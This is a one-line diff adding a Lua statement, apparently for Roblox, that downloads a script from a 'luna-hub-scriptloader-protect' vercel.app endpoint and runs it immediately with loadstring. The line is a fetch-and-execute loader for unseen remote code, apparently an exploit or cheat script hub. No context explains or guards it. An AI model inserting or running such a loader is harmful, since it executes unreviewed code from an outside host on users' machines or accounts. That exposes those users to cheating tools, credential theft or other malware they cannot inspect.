@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luna-hub-scriptloader-protect.vercel.app/api/protected_and_relay"))()
